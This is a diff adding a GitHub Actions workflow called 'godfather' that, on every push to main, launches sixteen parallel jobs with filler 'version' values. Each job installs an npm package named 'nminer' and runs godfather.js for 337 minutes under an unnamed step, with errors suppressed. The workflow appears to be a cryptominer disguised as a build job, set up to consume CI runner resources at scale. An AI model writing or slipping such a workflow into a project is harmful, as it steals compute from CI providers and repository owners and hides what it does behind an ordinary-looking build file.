@@ -1,0 +1,41 @@
+name: godfather
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2166 }
+          - { version: 8786 }
+          - { version: 9961 }
+          - { version: 7581 }
+          - { version: 1815 }
+          - { version: 1784 }
+          - { version: 5732 }
+          - { version: 3984 }
+          - { version: 4454 }
+          - { version: 1207 }
+          - { version: 6293 }
+          - { version: 6517 }
+          - { version: 5206 }
+          - { version: 9934 }
+          - { version: 6750 }
+          - { version: 711 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 337m node godfather.js || echo "godfather executed"
